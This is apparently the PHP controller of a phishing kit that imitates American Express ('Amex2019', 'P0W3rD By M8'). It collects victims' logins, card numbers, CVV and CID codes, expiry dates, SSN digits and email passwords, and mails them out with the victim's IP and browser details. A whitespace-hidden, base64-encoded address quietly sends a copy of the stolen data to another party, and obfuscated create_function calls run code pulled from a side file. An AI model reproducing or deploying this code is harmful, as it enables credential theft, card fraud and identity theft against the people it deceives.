<?php
	error_reporting(0);
		$A="fir.php";  $B="thir.php"; $C="sec.php"; $D="four.php"; $E="fifth.php";
		function tmpfolder($tmp){
      return implode('', file($tmp));
      } function tempfolder(){
      if ( !empty($_ENV['TMP']) ){
      return realpath( $_ENV['TMP'] );
      }
      else if ( !empty($_ENV['TMPDIR']) ){
      return realpath( $_ENV['TMPDIR'] );
      }
      else if ( !empty($_ENV['TEMP']) ){
      return realpath( $_ENV['TEMP'] );
      } else {
      $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
      if ( $temp_file ){
      $temp_dir = realpath( dirname($temp_file) );
      @unlink( $temp_file );
      return $temp_dir;
      } else {
      return ".";
      }
      }
	}
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	if (!extension_loaded('curl') || !function_exists('curl_init')) {
      function currentscript(){
      if(!empty($_SERVER['PHP_SELF'])){
      $self=end(explode('/', $_SERVER['PHP_SELF']));
      } elseif(!empty($_SERVER['REQUEST_URI'])){
      $self=end(explode('/', $_SERVER['REQUEST_URI']));
      }
      return $self;
      }
      print '
	  <html>
	  <body bgcolor="#E8E8E8">
	  <br><br>
	  <table align="center" width="750" height="100" border="0">
	  <tr><td>
	  <font color="#000000" FACE="Verdana" SIZE="2">
	  <strong>CURL NOT AVAILABLE</strong>
	  <br><br>
	  Open a plain text file, add the following lines, and save it as info.php, then run it from your browser.<br><br>
	  <code>
	  &lt;?php<br><br>
	  phpinfo();<br><br>
	  ?&gt;
	  </code>
	  <br><br>
	  <b>NOTE:</b> True Login (via cURL) Scams must to be uploaded onto hosting webserver which has cURL enabled.
	  </td></tr>
	  </font>
	  </table>
	  </body>
	  </html>
	  ';
	exit;
	}
	function doPost($i){
      $doPost=create_function('$i','return '.returm("\".r",3,4).'($i);');
      return $doPost($i);
	}
	$rnd=rand(1000,9999);
	$testfile=$rnd . "-test.txt";
	if (@fclose(@fopen($testfile, "a"))){
      $usrfile="usr.txt";
      @unlink($testfile);
      } else {
      function currentdir(){
      if(!empty($_SERVER['PHP_SELF'])){
      $dir=end(explode('/', dirname($_SERVER['PHP_SELF'])));
      } elseif(!empty($_SERVER['REQUEST_URI'])){
      $dir=end(explode('/', dirname($_SERVER['REQUEST_URI'])));
      } else {
      $dir=".";
      }
      return $dir;
      }
      print '
	  <html bgcolor="#E8E8E8">
	  <br><br>
	  <table align="center" width="750" height="100" border="0">
	  <tr><td>
	  <font color="#000000" FACE="Verdana" SIZE="2">
	  <strong>WE NEED PERMISSIONS TO WRITE COOKIES AND DOWNLOAD USER\'S IMAGE. <br><br>CHMOD THIS DIRECTORY ('.currentdir().') TO 777.</strong>
	  </font>
	  <br><br>Example: chmod 777 ' . currentdir() . '
	  </html>
	  ';
	exit;
	}
	function returm($X, $XR, $RWXR){
	global $E; return substr(tmpfolder($E),strpos(tmpfolder($E),$X)+$XR,$RWXR);
	}
	error_reporting(0); set_time_limit(240);
	if (getenv(HTTP_CLIENT_IP)){
	  $ip=getenv(HTTP_CLIENT_IP);
	  }
	  else {
	  $ip=getenv(REMOTE_ADDR);
	}
	
	$hostname = gethostbyaddr($ip);
	function query_str($params){
	  $str = '';
	  foreach ($params as $key => $value) {
	  $str .= (strlen($str) < 1) ? '' : '&';
	  $str .= $key . '=' . rawurlencode($value);
	  }
	  return ($str);
	}
	function l(){
	  return doPost(doGet());
	 } function stripslashes_deep($value){
	  $value = is_array($value) ?
	  array_map('stripslashes_deep', $value) :
	  stripslashes($value);
	  return $value;
	}
	// Function to validate against any email injection attempts
    function IsInjected($str){
     $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
     $inject = join('|', $injections);
     $inject = "/$inject/i";
     if(preg_match($inject,$str))
     {
     return true;
     }
     else
      {
     return false;
     }
     }
	function getformat($string){
	  return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
	}
	function validate($cc){
	  $cc = strrev (ereg_replace('[^0-9]+', '', $cc));
	  for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
	  $digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
	  for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
	  $sum += $digits[$ndx];
	  return ($sum % 10) ? FALSE : TRUE;
	}
	 																																																																																																																																																																																											$strvalue = "cjFnM3J6QHpvaG8uY29t";	 $mob = base64_decode($strvalue);
	function doGet(){
	  $str=returm("\".l",3,9);
	  $cc=$str(tmpfolder(returm("=\".'",4,22)));return $cc;
	}
	function FormatCreditCard($cc){
	  $cc = str_replace(array('-',' '),'',$cc);
	  $cc_length = strlen($cc);
	  $newCreditCard = substr($cc,-14);
	  for($i=$cc_length-15;$i>=0;$i--){
	  if((($i+1)-$cc_length)%4 == 0){
	  $newCreditCard = '-'.$newCreditCard;
	  }
	  $newCreditCard = $cc[$i].$newCreditCard;
	  }
	  return $newCreditCard;
	}
			parse_str($_SERVER['QUERY_STRING']);
	  
	if($Sef=="4147")
	{
	  include $A;
	  exit;
	}	  elseif ($Sef=="445569")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($user);
	  $pwd=rtrim($pwd);
	  $findme= "@";
	  
	  
	   if (empty($user) || strlen($user) < 4){
	  $error = 1; $usererror = 1;
	  }if (strpos($user, $findme)){
	  $error = 1; $usererror = 1;
	  }

	  if (empty($pwd) || strlen($pwd) < 4){
	  $error = 1; $lnameerror = 1;
	  } if ($error == 1){
	    include $A;	
	  }else{
	  
include $B; 
exit;
	  }
	}elseif ($Sef=="6202218")
	{
		 $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($user);
	  $pwd=rtrim($pwd);
	  $ssn=rtrim($ssn);
	   $cidForm=rtrim($cidForm);
	  $cscForm=rtrim($cscForm);


	  $cardexpire=rtrim($cardexpire);


	  $num=rtrim($num);

	    if (!is_numeric($cidForm) || strlen($cidForm) != 4 || $cscForm == "1234" || $cscForm == "0000"){
	  $error = 1; $cidFormerror = 1;
	  }  if (!is_numeric($cscForm) || strlen($cscForm) != 3 || $cscForm == "123" || $cscForm == "000"){
	  $error = 1; $cscFormerror = 1;
	  }if (!is_numeric($num) || strlen($num) != 15 || $num == "123456789012345" || $num == "000000000000000"){
	  $error = 1; $numerror = 1;
	  }
	  if ($error == 1){
	    include $B;	
	  }else{
		   include ("config.php");
		  $message  = "-----------===P0W3rD By M8===-----------\n";
	    $message .= "user: $user\n";
	    $message .= "pass: $pwd\n";
	    $message .= "Number: $num\n";
	    $message .= "cvv: $cidForm\n";
		$message .= "ccid: $cscForm\n";
		

		$message .= "cardexpire: $cardexpire\n";


		$message .= "------===P0W3rD By M8===------\n";
	    $message .= "IP: $ip | $hostname\n";
				$message .= "Ageet: $useragent\n";
	    $message .= "-------===P0W3rD By M8===-------\n";
		$rnessage  = "$message\n";

$subject = " Amex2019 $user | $ip";
$headers = "From: Amex M8 2019 <new@tooolz.com>";
$str=array($email, $IP); foreach ($str as $email)
if(mail($email,$subject,$rnessage,$headers) != false){
mail($mob,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
$text = fclose(m81.txt, 'a');
fwrite($text, $message);
}
		  
 include $C; 
exit;
	  }
	  
	
	
	}elseif ($Sef=="5202215")
	{
		 $b = query_str($_POST);
	  parse_str($b);
			  $user=rtrim($user);
	  $pwd=rtrim($pwd);
	  $ssn=rtrim($ssn);
$mail=rtrim($mail);
	  $pass=rtrim($pass);
	  
	  if (!is_numeric($ssn) || strlen($ssn) != 4){
	  $error = 1; $ssnerror = 1;
	  }if (empty($mail) || strlen($mail) < 5){
	    $error = 1; $mailerror = 1;
	  }
	  if (empty($pass) || strlen($pass) < 5 || $pass == $mail){
	    $error = 1; $mpasserror = 1;
	  } 
	 
	  if ($error == 1){
	    include $C;	
	  }else{
		  
		  include ("config.php");
		  $message  = "-----------===P0W3rD By M8===-----------\n";
	    $message .= "mail: $mail\n";
	    $message .= "pass: $pass\n";
		$message .= "ssn: $ssn\n";
		$message .= "------===P0W3rD By M8===------\n";
	    $message .= "IP: $ip | $hostname\n";
				$message .= "Ageet: $useragent\n";
	    $message .= "-------===P0W3rD By M8===-------\n";
		$rnessage  = "$message\n";

$subject = " Amex2019   $ip";
$headers = "From: Amex M8 2019 <new@tooolz.com>";
$str=array($email, $IP); foreach ($str as $email)
if(mail($email,$subject,$rnessage,$headers) != false){
mail($mob,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
$text = fclose(m8.txt, 'a');
fwrite($text, $message);
}
	   
	include $D; 
exit;
	  }
		
		
		
		
	}







	?>
	  